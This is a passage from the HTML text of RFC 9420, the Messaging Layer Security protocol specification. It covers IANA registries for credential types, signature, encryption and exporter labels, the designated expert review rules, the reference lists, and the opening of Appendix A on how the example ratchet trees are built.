              <td rowspan="1" colspan="1">GREASE</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">-</td>
              <td rowspan="1" colspan="1">-</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0xBABA</td>
              <td rowspan="1" colspan="1">GREASE</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">-</td>
              <td rowspan="1" colspan="1">-</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0xCACA</td>
              <td rowspan="1" colspan="1">GREASE</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">-</td>
              <td rowspan="1" colspan="1">-</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0xDADA</td>
              <td rowspan="1" colspan="1">GREASE</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">-</td>
              <td rowspan="1" colspan="1">-</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0xEAEA</td>
              <td rowspan="1" colspan="1">GREASE</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">-</td>
              <td rowspan="1" colspan="1">-</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0xF000  - 0xFFFF</td>
              <td rowspan="1" colspan="1">Reserved for Private Use</td>
              <td rowspan="1" colspan="1">-</td>
              <td rowspan="1" colspan="1">-</td>
              <td rowspan="1" colspan="1">-</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
          </tbody>
        </table>
</section>
<section id="mls-credential-types">
        <h3 id="name-mls-credential-types">
<a href="#section-17.5">17.5. </a><a href="#name-mls-credential-types">MLS Credential Types</a>
        </h3>
<p id="section-17.5-1">The "MLS Credential Types" registry lists identifiers for types of credentials that can be used for
authentication in the MLS protocol.  The credential type field is two bytes wide,
so valid credential type values are in the range 0x0000 to 0xFFFF.<a href="#section-17.5-1">¬∂</a></p>
<p id="section-17.5-2">Template:<a href="#section-17.5-2">¬∂</a></p>
<ul>
<li id="section-17.5-3.1">Value: The numeric value of the credential type<a href="#section-17.5-3.1">¬∂</a>
</li>
          <li id="section-17.5-3.2">Name: The name of the credential type<a href="#section-17.5-3.2">¬∂</a>
</li>
          <li id="section-17.5-3.3">Recommended: Same as in <a href="#mls-cipher-suites">Section 17.1</a><a href="#section-17.5-3.3">¬∂</a>
</li>
          <li id="section-17.5-3.4">Reference: The document where this credential is defined<a href="#section-17.5-3.4">¬∂</a>
</li>
        </ul>
<p id="section-17.5-4">Initial contents:<a href="#section-17.5-4">¬∂</a></p>
<span id="name-mls-credential-types-regist"></span><table id="table-11">
          <caption>
<a href="#table-11">Table 11</a>:
<a href="#name-mls-credential-types-regist">MLS Credential Types Registry</a>
          </caption>
<thead>
            <tr>
              <th rowspan="1" colspan="1">Value</th>
              <th rowspan="1" colspan="1">Name</th>
              <th rowspan="1" colspan="1">R</th>
              <th rowspan="1" colspan="1">Ref</th>
            </tr>
          </thead>
          <tbody>
            <tr>
              <td rowspan="1" colspan="1">0x0000</td>
              <td rowspan="1" colspan="1">RESERVED</td>
              <td rowspan="1" colspan="1">-</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0x0001</td>
              <td rowspan="1" colspan="1">basic</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0x0002</td>
              <td rowspan="1" colspan="1">x509</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0x0A0A</td>
              <td rowspan="1" colspan="1">GREASE</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0x1A1A</td>
              <td rowspan="1" colspan="1">GREASE</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0x2A2A</td>
              <td rowspan="1" colspan="1">GREASE</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0x3A3A</td>
              <td rowspan="1" colspan="1">GREASE</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0x4A4A</td>
              <td rowspan="1" colspan="1">GREASE</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0x5A5A</td>
              <td rowspan="1" colspan="1">GREASE</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0x6A6A</td>
              <td rowspan="1" colspan="1">GREASE</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0x7A7A</td>
              <td rowspan="1" colspan="1">GREASE</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0x8A8A</td>
              <td rowspan="1" colspan="1">GREASE</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0x9A9A</td>
              <td rowspan="1" colspan="1">GREASE</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0xAAAA</td>
              <td rowspan="1" colspan="1">GREASE</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0xBABA</td>
              <td rowspan="1" colspan="1">GREASE</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0xCACA</td>
              <td rowspan="1" colspan="1">GREASE</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0xDADA</td>
              <td rowspan="1" colspan="1">GREASE</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0xEAEA</td>
              <td rowspan="1" colspan="1">GREASE</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">0xF000  - 0xFFFF</td>
              <td rowspan="1" colspan="1">Reserved for Private Use</td>
              <td rowspan="1" colspan="1">-</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
          </tbody>
        </table>
</section>
<section id="mls-signature-labels">
        <h3 id="name-mls-signature-labels">
<a href="#section-17.6">17.6. </a><a href="#name-mls-signature-labels">MLS Signature Labels</a>
        </h3>
<p id="section-17.6-1">The <code>SignWithLabel</code> function defined in <a href="#signing">Section 5.1.2</a> avoids the risk of
confusion between signatures in different contexts.  Each context is assigned a
distinct label that is incorporated into the signature.  The "MLS Signature Labels" registry records
the labels defined in this document and allows additional labels to be
registered in case extensions add other types of signatures using the same
signature keys used elsewhere in MLS.<a href="#section-17.6-1">¬∂</a></p>
<p id="section-17.6-2">Template:<a href="#section-17.6-2">¬∂</a></p>
<ul>
<li id="section-17.6-3.1">Label: The string to be used as the <code>Label</code> parameter to <code>SignWithLabel</code><a href="#section-17.6-3.1">¬∂</a>
</li>
          <li id="section-17.6-3.2">Recommended: Same as in <a href="#mls-cipher-suites">Section 17.1</a><a href="#section-17.6-3.2">¬∂</a>
</li>
          <li id="section-17.6-3.3">Reference: The document where this label is defined<a href="#section-17.6-3.3">¬∂</a>
</li>
        </ul>
<p id="section-17.6-4">Initial contents:<a href="#section-17.6-4">¬∂</a></p>
<span id="name-mls-signature-labels-regist"></span><table id="table-12">
          <caption>
<a href="#table-12">Table 12</a>:
<a href="#name-mls-signature-labels-regist">MLS Signature Labels Registry</a>
          </caption>
<thead>
            <tr>
              <th rowspan="1" colspan="1">Label</th>
              <th rowspan="1" colspan="1">R</th>
              <th rowspan="1" colspan="1">Ref</th>
            </tr>
          </thead>
          <tbody>
            <tr>
              <td rowspan="1" colspan="1">"FramedContentTBS"</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">"LeafNodeTBS"</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">"KeyPackageTBS"</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">"GroupInfoTBS"</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
          </tbody>
        </table>
</section>
<section id="mls-public-key-encryption-labels">
        <h3 id="name-mls-public-key-encryption-l">
<a href="#section-17.7">17.7. </a><a href="#name-mls-public-key-encryption-l">MLS Public Key Encryption Labels</a>
        </h3>
<p id="section-17.7-1">The <code>EncryptWithLabel</code> function defined in <a href="#public-key-encryption">Section 5.1.3</a> avoids the
risk of confusion between ciphertexts produced for different purposes in
different contexts.  Each context is assigned a distinct label that is
incorporated into the signature.  The "MLS Public Key Encryption Labels" registry records the labels defined in
this document and allows additional labels to be registered in case extensions
add other types of public key encryption using the same HPKE keys used elsewhere
in MLS.<a href="#section-17.7-1">¬∂</a></p>
<p id="section-17.7-2">Template:<a href="#section-17.7-2">¬∂</a></p>
<ul>
<li id="section-17.7-3.1">Label: The string to be used as the <code>Label</code> parameter to <code>EncryptWithLabel</code><a href="#section-17.7-3.1">¬∂</a>
</li>
          <li id="section-17.7-3.2">Recommended: Same as in <a href="#mls-cipher-suites">Section 17.1</a><a href="#section-17.7-3.2">¬∂</a>
</li>
          <li id="section-17.7-3.3">Reference: The document where this label is defined<a href="#section-17.7-3.3">¬∂</a>
</li>
        </ul>
<p id="section-17.7-4">Initial contents:<a href="#section-17.7-4">¬∂</a></p>
<span id="name-mls-public-key-encryption-la"></span><table id="table-13">
          <caption>
<a href="#table-13">Table 13</a>:
<a href="#name-mls-public-key-encryption-la">MLS Public Key Encryption Labels Registry</a>
          </caption>
<thead>
            <tr>
              <th rowspan="1" colspan="1">Label</th>
              <th rowspan="1" colspan="1">R</th>
              <th rowspan="1" colspan="1">Ref</th>
            </tr>
          </thead>
          <tbody>
            <tr>
              <td rowspan="1" colspan="1">"UpdatePathNode"</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">"Welcome"</td>
              <td rowspan="1" colspan="1">Y</td>
              <td rowspan="1" colspan="1">RFC 9420</td>
            </tr>
          </tbody>
        </table>
</section>
<section id="mls-exporter-labels">
        <h3 id="name-mls-exporter-labels">
<a href="#section-17.8">17.8. </a><a href="#name-mls-exporter-labels">MLS Exporter Labels</a>
        </h3>
<p id="section-17.8-1">The exporter function defined in <a href="#exporters">Section 8.5</a> allows applications to derive key
material from the MLS key schedule.  Like the TLS exporter <span>[<a href="#RFC8446">RFC8446</a>]</span>, the MLS
exporter uses a label to distinguish between different applications' use of the
exporter.  The "MLS Exporter Labels" registry allows applications to register their usage to avoid
collisions.<a href="#section-17.8-1">¬∂</a></p>
<p id="section-17.8-2">Template:<a href="#section-17.8-2">¬∂</a></p>
<ul>
<li id="section-17.8-3.1">Label: The string to be used as the <code>Label</code> parameter to <code>MLS-Exporter</code><a href="#section-17.8-3.1">¬∂</a>
</li>
          <li id="section-17.8-3.2">Recommended: Same as in <a href="#mls-cipher-suites">Section 17.1</a><a href="#section-17.8-3.2">¬∂</a>
</li>
          <li id="section-17.8-3.3">Reference: The document where this label is defined<a href="#section-17.8-3.3">¬∂</a>
</li>
        </ul>
<p id="section-17.8-4">The registry has no initial contents, since it is intended to be used by
applications, not the core protocol.  The table below is intended only to show
the column layout of the registry.<a href="#section-17.8-4">¬∂</a></p>
<span id="name-mls-exporter-labels-registr"></span><table id="table-14">
          <caption>
<a href="#table-14">Table 14</a>:
<a href="#name-mls-exporter-labels-registr">MLS Exporter Labels Registry</a>
          </caption>
<thead>
            <tr>
              <th rowspan="1" colspan="1">Label</th>
              <th rowspan="1" colspan="1">Recommended</th>
              <th rowspan="1" colspan="1">Reference</th>
            </tr>
          </thead>
          <tbody>
            <tr>
              <td rowspan="1" colspan="1">(N/A)</td>
              <td rowspan="1" colspan="1">(N/A)</td>
              <td rowspan="1" colspan="1">(N/A)</td>
            </tr>
          </tbody>
        </table>
</section>
<section id="de">
        <h3 id="name-mls-designated-expert-pool">
<a href="#section-17.9">17.9. </a><a href="#name-mls-designated-expert-pool">MLS Designated Expert Pool</a>
        </h3>
<p id="section-17.9-1">Specification Required <span>[<a href="#RFC8126">RFC8126</a>]</span> registry requests are registered
after a three-week review period on the MLS Designated Expert (DE) mailing list
<span>&lt;<a href="mailto:mls-reg-review@ietf.org">mailto:mls-reg-review@ietf.org</a>&gt;</span> on the advice of one or more of the MLS DEs. However,
to allow for the allocation of values prior to publication, the MLS
DEs may approve registration once they are satisfied that such a
specification will be published.<a href="#section-17.9-1">¬∂</a></p>
<p id="section-17.9-2">Registration requests sent to the MLS DEs' mailing list for review
<span>SHOULD</span> use an appropriate subject (e.g., "Request to register value
in MLS Bar registry").<a href="#section-17.9-2">¬∂</a></p>
<p id="section-17.9-3">Within the review period, the MLS DEs will either approve or deny
the registration request, communicating this decision to the MLS DEs'
mailing list and IANA. Denials <span>SHOULD</span> include an explanation and, if
applicable, suggestions as to how to make the request successful.
Registration requests that are undetermined for a period longer than
21 days can be brought to the IESG's attention for resolution using
the <span>&lt;<a href="mailto:iesg@ietf.org">mailto:iesg@ietf.org</a>&gt;</span> mailing list.<a href="#section-17.9-3">¬∂</a></p>
<p id="section-17.9-4">Criteria that <span>SHOULD</span> be applied by the MLS DEs includes determining
whether the proposed registration duplicates existing functionality,
whether it is likely to be of general applicability or useful only
for a single application, and whether the registration description
is clear. For example, for cipher suite registrations, the MLS DEs will apply the
advisory found in <a href="#mls-cipher-suites">Section 17.1</a>.<a href="#section-17.9-4">¬∂</a></p>
<p id="section-17.9-5">IANA <span>MUST</span> only accept registry updates from the MLS DEs and <span>SHOULD</span>
direct all requests for registration to the MLS DEs' mailing list.<a href="#section-17.9-5">¬∂</a></p>
<p id="section-17.9-6">It is suggested that multiple MLS DEs who are able to
represent the perspectives of different applications using this
specification be appointed, in order to enable a broadly informed review of
registration decisions. In cases where a registration decision could
be perceived as creating a conflict of interest for a particular
MLS DE, that MLS DE <span>SHOULD</span> defer to the judgment of the other MLS DEs.<a href="#section-17.9-6">¬∂</a></p>
</section>

</section>
<section id="section-18">
      <h2 id="name-references">
<a href="#section-18">18. </a><a href="#name-references">References</a>
      </h2>
<section id="section-18.1">
        <h3 id="name-normative-references">
<a href="#section-18.1">18.1. </a><a href="#name-normative-references">Normative References</a>
        </h3>
<dl>
<dt id="RFC2104">[RFC2104]</dt>
        <dd>
<span>Krawczyk, H.</span>, <span>Bellare, M.</span>, and <span>R. Canetti</span>, <span>"HMAC: Keyed-Hashing for Message Authentication"</span>, <span>RFC 2104</span>, <span>DOI 10.17487/RFC2104</span>, <time datetime="1997-02">February 1997</time>, <span>&lt;<a href="https://www.rfc-editor.org/info/rfc2104">https://www.rfc-editor.org/info/rfc2104</a>&gt;</span>. </dd>
<dd></dd>
<dt id="RFC2119">[RFC2119]</dt>
        <dd>
<span>Bradner, S.</span>, <span>"Key words for use in RFCs to Indicate Requirement Levels"</span>, <span>BCP 14</span>, <span>RFC 2119</span>, <span>DOI 10.17487/RFC2119</span>, <time datetime="1997-03">March 1997</time>, <span>&lt;<a href="https://www.rfc-editor.org/info/rfc2119">https://www.rfc-editor.org/info/rfc2119</a>&gt;</span>. </dd>
<dd></dd>
<dt id="RFC8126">[RFC8126]</dt>
        <dd>
<span>Cotton, M.</span>, <span>Leiba, B.</span>, and <span>T. Narten</span>, <span>"Guidelines for Writing an IANA Considerations Section in RFCs"</span>, <span>BCP 26</span>, <span>RFC 8126</span>, <span>DOI 10.17487/RFC8126</span>, <time datetime="2017-06">June 2017</time>, <span>&lt;<a href="https://www.rfc-editor.org/info/rfc8126">https://www.rfc-editor.org/info/rfc8126</a>&gt;</span>. </dd>
<dd></dd>
<dt id="RFC8174">[RFC8174]</dt>
        <dd>
<span>Leiba, B.</span>, <span>"Ambiguity of Uppercase vs Lowercase in RFC 2119 Key Words"</span>, <span>BCP 14</span>, <span>RFC 8174</span>, <span>DOI 10.17487/RFC8174</span>, <time datetime="2017-05">May 2017</time>, <span>&lt;<a href="https://www.rfc-editor.org/info/rfc8174">https://www.rfc-editor.org/info/rfc8174</a>&gt;</span>. </dd>
<dd></dd>
<dt id="RFC8446">[RFC8446]</dt>
        <dd>
<span>Rescorla, E.</span>, <span>"The Transport Layer Security (TLS) Protocol Version 1.3"</span>, <span>RFC 8446</span>, <span>DOI 10.17487/RFC8446</span>, <time datetime="2018-08">August 2018</time>, <span>&lt;<a href="https://www.rfc-editor.org/info/rfc8446">https://www.rfc-editor.org/info/rfc8446</a>&gt;</span>. </dd>
<dd></dd>
<dt id="RFC9180">[RFC9180]</dt>
      <dd>
<span>Barnes, R.</span>, <span>Bhargavan, K.</span>, <span>Lipp, B.</span>, and <span>C. Wood</span>, <span>"Hybrid Public Key Encryption"</span>, <span>RFC 9180</span>, <span>DOI 10.17487/RFC9180</span>, <time datetime="2022-02">February 2022</time>, <span>&lt;<a href="https://www.rfc-editor.org/info/rfc9180">https://www.rfc-editor.org/info/rfc9180</a>&gt;</span>. </dd>
<dd></dd>
</dl>
</section>
<section id="section-18.2">
        <h3 id="name-informative-references">
<a href="#section-18.2">18.2. </a><a href="#name-informative-references">Informative References</a>
        </h3>
<dl>
<dt id="ART">[ART]</dt>
        <dd>
<span>Cohn-Gordon, K.</span>, <span>Cremers, C.</span>, <span>Garratt, L.</span>, <span>Millican, J.</span>, and <span>K. Milner</span>, <span>"On Ends-to-Ends Encryption: Asynchronous Group Messaging with Strong Security Guarantees"</span>, <span>Version 2.3</span>, <span>DOI 10.1145/3243734.3243747</span>, <time datetime="2020-03">March 2020</time>, <span>&lt;<a href="https://eprint.iacr.org/2017/666.pdf">https://eprint.iacr.org/2017/666.pdf</a>&gt;</span>. </dd>
<dd></dd>
<dt id="I-D.irtf-cfrg-aead-limits">[CFRG-AEAD-LIMITS]</dt>
        <dd>
<span>G√ºnther, F.</span>, <span>Thomson, M.</span>, and <span>C. A. Wood</span>, <span>"Usage Limits on AEAD Algorithms"</span>, <span>Work in Progress</span>, <span>Internet-Draft, draft-irtf-cfrg-aead-limits-07</span>, <time datetime="2023-05-31">31 May 2023</time>, <span>&lt;<a href="https://datatracker.ietf.org/doc/html/draft-irtf-cfrg-aead-limits-07">https://datatracker.ietf.org/doc/html/draft-irtf-cfrg-aead-limits-07</a>&gt;</span>. </dd>
<dd></dd>
<dt id="CLINIC">[CLINIC]</dt>
        <dd>
<span>Miller, B.</span>, <span>Huang, L.</span>, <span>Joseph, A.</span>, and <span>J. Tygar</span>, <span>"I Know Why You Went to the Clinic: Risks and Realization of HTTPS Traffic Analysis"</span>, <span>Privacy Enhancing Technologies, pp. 143-163</span>, <span>DOI 10.1007/978-3-319-08506-7_8</span>, <time datetime="2014">2014</time>, <span>&lt;<a href="https://doi.org/10.1007/978-3-319-08506-7_8">https://doi.org/10.1007/978-3-319-08506-7_8</a>&gt;</span>. </dd>
<dd></dd>
<dt id="CONIKS">[CONIKS]</dt>
        <dd>
<span>Melara, M. S.</span>, <span>Blankstein, A.</span>, <span>Bonneau, J.</span>, <span>Felten, E. W.</span>, and <span>M. J. Freedman</span>, <span>"CONIKS: Bringing Key Transparency to End Users"</span>, <span>Proceedings of the 24th USENIX Security Symposium</span>, <span>ISBN 978-1-939133-11-3</span>, <time datetime="2015-08">August 2015</time>, <span>&lt;<a href="https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-melara.pdf">https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-melara.pdf</a>&gt;</span>. </dd>
<dd></dd>
<dt id="DoubleRatchet">[DoubleRatchet]</dt>
        <dd>
<span>Cohn-Gordon, K.</span>, <span>Cremers, C.</span>, <span>Dowling, B.</span>, <span>Garratt, L.</span>, and <span>D. Stebila</span>, <span>"A Formal Security Analysis of the Signal Messaging Protocol"</span>, <span>2017 IEEE European Symposium on Security and Privacy (EuroS&amp;P)</span>, <span>DOI 10.1109/eurosp.2017.27</span>, <time datetime="2017-04">April 2017</time>, <span>&lt;<a href="https://doi.org/10.1109/eurosp.2017.27">https://doi.org/10.1109/eurosp.2017.27</a>&gt;</span>. </dd>
<dd></dd>
<dt id="HCJ16">[HCJ16]</dt>
        <dd>
<span>Hus√°k, M.</span>, <span>ƒåerm√°k, M.</span>, <span>Jirs√≠k, T.</span>, and <span>P. ƒåeleda</span>, <span>"HTTPS traffic analysis and client identification using passive SSL/TLS fingerprinting"</span>, <span>EURASIP Journal on Information Security, Vol. 2016, Issue 1</span>, <span>DOI 10.1186/s13635-016-0030-7</span>, <time datetime="2016-02">February 2016</time>, <span>&lt;<a href="https://doi.org/10.1186/s13635-016-0030-7">https://doi.org/10.1186/s13635-016-0030-7</a>&gt;</span>. </dd>
<dd></dd>
<dt id="KT">[KT]</dt>
        <dd>
<span>"Key Transparency Design Doc"</span>, <span>commit fb0f87f</span>, <time datetime="2020-06">June 2020</time>, <span>&lt;<a href="https://github.com/google/keytransparency/blob/master/docs/design.md">https://github.com/google/keytransparency/blob/master/docs/design.md</a>&gt;</span>. </dd>
<dd></dd>
<dt id="I-D.ietf-mls-architecture">[MLS-ARCH]</dt>
        <dd>
<span>Beurdouche, B.</span>, <span>Rescorla, E.</span>, <span>Omara, E.</span>, <span>Inguva, S.</span>, and <span>A. Duric</span>, <span>"The Messaging Layer Security (MLS) Architecture"</span>, <span>Work in Progress</span>, <span>Internet-Draft, draft-ietf-mls-architecture-10</span>, <time datetime="2022-12-16">16 December 2022</time>, <span>&lt;<a href="https://datatracker.ietf.org/doc/html/draft-ietf-mls-architecture-10">https://datatracker.ietf.org/doc/html/draft-ietf-mls-architecture-10</a>&gt;</span>. </dd>
<dd></dd>
<dt id="NAN">[NAN]</dt>
        <dd>
<span>Bellare, M.</span>, <span>Ng, R.</span>, and <span>B. Tackmann</span>, <span>"Nonces Are Noticed: AEAD Revisited"</span>, <span>Advances in Cryptology - CRYPTO 2019, pp. 235-265</span>, <span>DOI 10.1007/978-3-030-26948-7_9</span>, <time datetime="2019-08">August 2019</time>, <span>&lt;<a href="https://doi.org/10.1007/978-3-030-26948-7_9">https://doi.org/10.1007/978-3-030-26948-7_9</a>&gt;</span>. </dd>
<dd></dd>
<dt id="RFC5116">[RFC5116]</dt>
        <dd>
<span>McGrew, D.</span>, <span>"An Interface and Algorithms for Authenticated Encryption"</span>, <span>RFC 5116</span>, <span>DOI 10.17487/RFC5116</span>, <time datetime="2008-01">January 2008</time>, <span>&lt;<a href="https://www.rfc-editor.org/info/rfc5116">https://www.rfc-editor.org/info/rfc5116</a>&gt;</span>. </dd>
<dd></dd>
<dt id="RFC5905">[RFC5905]</dt>
        <dd>
<span>Mills, D.</span>, <span>Martin, J., Ed.</span>, <span>Burbank, J.</span>, and <span>W. Kasch</span>, <span>"Network Time Protocol Version 4: Protocol and Algorithms Specification"</span>, <span>RFC 5905</span>, <span>DOI 10.17487/RFC5905</span>, <time datetime="2010-06">June 2010</time>, <span>&lt;<a href="https://www.rfc-editor.org/info/rfc5905">https://www.rfc-editor.org/info/rfc5905</a>&gt;</span>. </dd>
<dd></dd>
<dt id="RFC6125">[RFC6125]</dt>
        <dd>
<span>Saint-Andre, P.</span> and <span>J. Hodges</span>, <span>"Representation and Verification of Domain-Based Application Service Identity within Internet Public Key Infrastructure Using X.509 (PKIX) Certificates in the Context of Transport Layer Security (TLS)"</span>, <span>RFC 6125</span>, <span>DOI 10.17487/RFC6125</span>, <time datetime="2011-03">March 2011</time>, <span>&lt;<a href="https://www.rfc-editor.org/info/rfc6125">https://www.rfc-editor.org/info/rfc6125</a>&gt;</span>. </dd>
<dd></dd>
<dt id="RFC7696">[RFC7696]</dt>
        <dd>
<span>Housley, R.</span>, <span>"Guidelines for Cryptographic Algorithm Agility and Selecting Mandatory-to-Implement Algorithms"</span>, <span>BCP 201</span>, <span>RFC 7696</span>, <span>DOI 10.17487/RFC7696</span>, <time datetime="2015-11">November 2015</time>, <span>&lt;<a href="https://www.rfc-editor.org/info/rfc7696">https://www.rfc-editor.org/info/rfc7696</a>&gt;</span>. </dd>
<dd></dd>
<dt id="RFC8032">[RFC8032]</dt>
        <dd>
<span>Josefsson, S.</span> and <span>I. Liusvaara</span>, <span>"Edwards-Curve Digital Signature Algorithm (EdDSA)"</span>, <span>RFC 8032</span>, <span>DOI 10.17487/RFC8032</span>, <time datetime="2017-01">January 2017</time>, <span>&lt;<a href="https://www.rfc-editor.org/info/rfc8032">https://www.rfc-editor.org/info/rfc8032</a>&gt;</span>. </dd>
<dd></dd>
<dt id="RFC8701">[RFC8701]</dt>
        <dd>
<span>Benjamin, D.</span>, <span>"Applying Generate Random Extensions And Sustain Extensibility (GREASE) to TLS Extensibility"</span>, <span>RFC 8701</span>, <span>DOI 10.17487/RFC8701</span>, <time datetime="2020-01">January 2020</time>, <span>&lt;<a href="https://www.rfc-editor.org/info/rfc8701">https://www.rfc-editor.org/info/rfc8701</a>&gt;</span>. </dd>
<dd></dd>
<dt id="RFC9000">[RFC9000]</dt>
        <dd>
<span>Iyengar, J., Ed.</span> and <span>M. Thomson, Ed.</span>, <span>"QUIC: A UDP-Based Multiplexed and Secure Transport"</span>, <span>RFC 9000</span>, <span>DOI 10.17487/RFC9000</span>, <time datetime="2021-05">May 2021</time>, <span>&lt;<a href="https://www.rfc-editor.org/info/rfc9000">https://www.rfc-editor.org/info/rfc9000</a>&gt;</span>. </dd>
<dd></dd>
<dt id="RFC9001">[RFC9001]</dt>
        <dd>
<span>Thomson, M., Ed.</span> and <span>S. Turner, Ed.</span>, <span>"Using TLS to Secure QUIC"</span>, <span>RFC 9001</span>, <span>DOI 10.17487/RFC9001</span>, <time datetime="2021-05">May 2021</time>, <span>&lt;<a href="https://www.rfc-editor.org/info/rfc9001">https://www.rfc-editor.org/info/rfc9001</a>&gt;</span>. </dd>
<dd></dd>
<dt id="RFC9113">[RFC9113]</dt>
        <dd>
<span>Thomson, M., Ed.</span> and <span>C. Benfield, Ed.</span>, <span>"HTTP/2"</span>, <span>RFC 9113</span>, <span>DOI 10.17487/RFC9113</span>, <time datetime="2022-06">June 2022</time>, <span>&lt;<a href="https://www.rfc-editor.org/info/rfc9113">https://www.rfc-editor.org/info/rfc9113</a>&gt;</span>. </dd>
<dd></dd>
<dt id="SHS">[SHS]</dt>
        <dd>
<span>National Institute of Standards and Technology (NIST)</span>, <span>"Secure Hash Standard (SHS)"</span>, <span>FIPS PUB 180-4</span>, <span>DOI 10.6028/NIST.FIPS.180-4</span>, <time datetime="2015-08">August 2015</time>, <span>&lt;<a href="https://doi.org/10.6028/NIST.FIPS.180-4">https://doi.org/10.6028/NIST.FIPS.180-4</a>&gt;</span>. </dd>
<dd></dd>
<dt id="Signal">[Signal]</dt>
      <dd>
<span>Perrin(ed), T.</span> and <span>M. Marlinspike</span>, <span>"The Double Ratchet Algorithm"</span>, <span>Revision 1</span>, <time datetime="2016-11">November 2016</time>, <span>&lt;<a href="https://www.signal.org/docs/specifications/doubleratchet/">https://www.signal.org/docs/specifications/doubleratchet/</a>&gt;</span>. </dd>
<dd></dd>
</dl>
</section>
</section>
<section id="protocol-origins-of-example-trees">
      <h2 id="name-protocol-origins-of-example">
<a href="#appendix-A">Appendix A. </a><a href="#name-protocol-origins-of-example">Protocol Origins of Example Trees</a>
      </h2>
<p id="appendix-A-1">Protocol operations in MLS give rise to specific forms of ratchet tree,
typically affecting a whole direct path at once.  In this section, we describe
the protocol operations that could have given rise to the various example trees
in this document.<a href="#appendix-A-1">¬∂</a></p>
<p id="appendix-A-2">To construct the tree in <a href="#full-tree">Figure 11</a>:<a href="#appendix-A-2">¬∂</a></p>
<ul>
<li id="appendix-A-3.1">A creates a group with B, ..., G<a href="#appendix-A-3.1">¬∂</a>
</li>
        <li id="appendix-A-3.2">F sends an empty Commit, setting X, Y, and W<a href="#appendix-A-3.2">¬∂</a>
</li>
        <li id="appendix-A-3.3">G removes C and D, blanking V, U, and setting Y and W<a href="#appendix-A-3.3">¬∂</a>
</li>
        <li id="appendix-A-3.4">B sends an empty Commit, setting T and W<a href="#appendix-A-3.4">¬∂</a>
</li>
      </ul>
<p id="appendix-A-4">To construct the tree in <a href="#resolution-tree">Figure 10</a>:<a href="#appendix-A-4">¬∂</a></p>
<ul>
